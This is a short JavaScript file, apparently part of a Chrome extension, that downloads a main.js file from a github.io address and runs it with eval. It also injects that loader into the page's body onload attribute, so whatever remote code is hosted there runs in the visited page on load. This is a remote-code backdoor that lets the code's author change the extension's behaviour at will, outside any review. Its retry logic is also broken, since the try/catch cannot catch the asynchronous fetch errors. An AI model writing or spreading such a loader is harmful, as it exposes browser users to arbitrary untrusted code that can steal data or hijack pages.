function unprotectedCodeFunction() {
	const dynamicallyCodeFileUrl = `https://kostya778899.github.io/
		GoogleChromeExtensions/DynamicallyChanging/DynamicallyCode/
		Version_00/main.js`;

	var i = 0;
	function tryStartDynamicallyCode(onSuccess) {
		try {
			fetch(dynamicallyCodeFileUrl)
				.then(response => response.text())
				.then((dynamicallyCode) => eval(dynamicallyCode));
		}
		catch(error) {
			if (i < 10) tryStartDynamicallyCode();
			i++;
		}
		finally {onSuccess();}
	}

	tryStartDynamicallyCode(() => {});
}

function getInParentheses(str) {
	const startIndex = str.indexOf("{") + 1;
	const endIndex = str.lastIndexOf("}") - startIndex;
	return str.substr(startIndex, endIndex);
}


console.log("Background worck.");

const unprotectedCode = getInParentheses(unprotectedCodeFunction.toString());
document.body?.setAttribute("onload", unprotectedCode);